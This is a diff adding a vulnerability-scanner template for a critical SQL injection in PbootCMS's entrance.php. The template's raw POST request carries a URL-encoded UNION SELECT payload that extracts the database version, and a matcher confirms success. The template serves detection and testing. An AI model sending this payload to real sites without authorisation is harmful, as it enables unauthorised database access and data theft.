@@ -1,0 +1,35 @@
+id: pbootcms-entrance-sqli
+
+info:
+  name: PbootCMS entrance.php - SQL Injection
+  author: qwtd
+  severity: critical
+  description: 由于PbootCMS entrance.php 文件代码逻辑缺陷存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息.
+  reference:
+    - https://github.com/wy876/POC/blob/main/PbootCMS/PbootCMS%E6%8E%A5%E5%8F%A3entrance.php%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cwe-id: CWE-89
+  metadata:
+    max-request: 1
+  tags: PBOOTCMS
+
+http:
+  - raw:
+      - |
+        POST /?tag=%7d%73%71%6c%3a%20%20%7b%70%62%6f%6f%74%3a%6c%69%73%74%20%66%69%6c%74%65%72%3d%31%3d%32%29%55%4e%49%4f%4e%28%53%45%4c%45%43%54%2f%2a%2a%2f%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%28%73%65%6c%65%63%74%2f%2a%2a%2f%76%65%72%73%69%6f%6e%28%29%29%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%29%2f%2a%2a%2f%23%2f%2a%2a%2f%7c%31%32%33%20%73%63%6f%64%65%3d%31%32%33%7d%5b%6c%69%73%74%3a%6c%69%6e%6b%20%6c%69%6e%6b%3d%61%73%64%5d%7b%2f%70%62%6f%6f%74%3a%6c%69%73%74%7d HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '<a href="/?tag/}sql'
+
+# digest: 4b0a00483046022100d3d6817f5ef153a11819b3b25cc8cbb2b86775f9c41c57d52bcb228c84662786022100d980c25d1e941dce7e07856b34886409f80a611250fe4dcfa5193b7aa30cffd2:922c64590222798bb761d5b6d8e72950
